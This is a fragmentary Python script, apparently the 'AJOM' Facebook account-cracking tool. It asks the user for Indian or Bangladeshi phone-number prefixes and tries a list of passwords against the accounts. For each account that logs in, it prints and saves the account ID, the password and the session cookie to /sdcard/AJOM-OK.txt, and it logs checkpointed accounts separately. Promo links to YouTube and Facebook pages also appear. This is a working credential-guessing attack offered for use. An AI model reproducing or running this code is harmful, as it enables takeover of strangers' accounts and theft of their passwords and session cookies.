...
logo = (""""\033[132m  ___     ___  ________  ___
 / _ \   |_  ||  _  |  \/  |
/ /_\ \    | || | | | .  . |
|  _  |    | || | | | |\/| |
| | | |/\__/ /\ \_/ / |  | |
\_| |_/\____/  \___/\_|  |_/\033[1;37m\n""")
def ud():
    os.system('clear')
    jalan(logo)
    ...
    if opt == '1':
        os.system('xdg-open https://youtube.com/@2lrff451')
        FD()
        return None
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/NillkabboSA03')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    if opt == '3':
        ...
        return None
    if opt == '4':
        os.system('xdg-open https://www.facebook.com/ajomsarker.3')
...
def i():
    ...
    jalan('\033[1;32m ══════════════════════════════════════════════════════════')
    jalan('\033[1;36m  IND CODES :  \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
    jalan('\033[1;32m ══════════════════════════════════════════════════════════')
    jalan('\033[1;36m  BD CODES    :  \033[1;33m016, \033[1;33m017 ,\033[1;33m018 ,\033[1;33m019,\033[1;33m013  ...\033[0;97m')
    jalan('\033[1;32m ══════════════════════════════════════════════════════════\n')
    code = input(' PUT CODE : ')
    print("")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[AJOM-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AJOM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[AJOM-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/AJOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[AJOM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
